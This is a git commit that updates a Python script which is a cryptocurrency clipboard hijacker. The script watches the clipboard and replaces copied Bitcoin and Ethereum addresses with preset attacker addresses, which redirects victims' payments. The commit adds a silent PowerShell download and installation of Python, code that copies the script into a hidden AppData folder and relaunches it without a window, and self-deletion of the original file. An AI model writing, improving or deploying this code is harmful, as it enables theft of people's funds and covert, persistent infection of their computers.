df05d2ef593003f2fb46349bc0f8daec695503c0
DramstiHe <122067299+DramstiHe@users.noreply.github.com>
2023-04-07 20:47:05 +0100

    Update script.py

--- script.py
+++ script.py
@@ -1,16 +1,39 @@
+import os
+import subprocess
+import sys
+
+def install_python_and_pyperclip():
+    python_version = "3.9.10"
+    python_url = "https://www.python.org/ftp/python/3.9.10/python-3.9.10-amd64.exe"
+    python_path = f"C:\\Python\\{python_version}\\python.exe"
+
+    if not os.path.exists(python_path):
+        # Download Python installer
+        subprocess.run(["powershell.exe", f"(New-Object Net.WebClient).DownloadFile('{python_url}', 'python.exe')"])
+        # Install Python
+        subprocess.run(["python.exe", "/quiet", f"InstallAllUsers=1", f"TargetDir=C:\\Python\\{python_version}", "Include_test=0"])
+        os.remove("python.exe")
+
+    # Install pyperclip
+    subprocess.run([python_path, "-m", "pip", "install", "pyperclip"])
+
+install_python_and_pyperclip()
+
+import os
 import pyperclip
+import shutil
 
 # Define the target addresses
 btc_addresses = {
-    "1": "",
-    "bc1": "",
-    "3": ""
+    "1": "examplebtcadd",
+    "bc1": "examplebtcadd",
+    "3": "examplebtcadd"
 }
-eth_addresses = ["", "", ""]
 
-# Function to replace copied address with the target address
+eth_addresses = ["exampleETHAddress", "exampleETHAddress", "exampleETHAddress"]
+
 def replace_address():
-    current_address = pyperclip.paste()
+    current_address = pyperclip.paste().strip()
     if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3"):
         if current_address in btc_addresses.values():
             return
@@ -24,16 +47,35 @@ def replace_address():
         if current_address in eth_addresses:
             return
         else:
-            pyperclip.copy(eth_addresses[0])
-            print(f"ETH address replaced: {current_address} -> {eth_addresses[0]}")
+            import random
+            new_address = random.choice(eth_addresses)
+            pyperclip.copy(new_address)
+            print(f"ETH address replaced: {current_address} -> {new_address}")
 
-# Call the replace_address() function whenever clipboard changes
 while True:
     try:
-        current_address = pyperclip.paste()
+        current_address = pyperclip.paste().strip()
         if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3") or current_address.startswith("0x"):
             replace_address()
     except KeyboardInterrupt:
         break
 
+# Save the current script path
+script_path = os.path.abspath(sys.argv[0])
+
+# Specify the new folder path in the user's AppData folder
+new_folder_path = os.path.expanduser("~\\AppData\\Local\\HiddenFolder")
+
+# Create the new folder if it doesn't exist
+os.makedirs(new_folder_path, exist_ok=True)
+
+# Copy the script to the new folder
+new_script_path = os.path.join(new_folder_path, os.path.basename(script_path))
+shutil.copy(script_path, new_script_path)
+
+# Run the new script silently
+subprocess.Popen([sys.executable, new_script_path], creationflags=subprocess.CREATE_NO_WINDOW)
+
+# Self-destruct the original script
+os.remove(script_path)
 
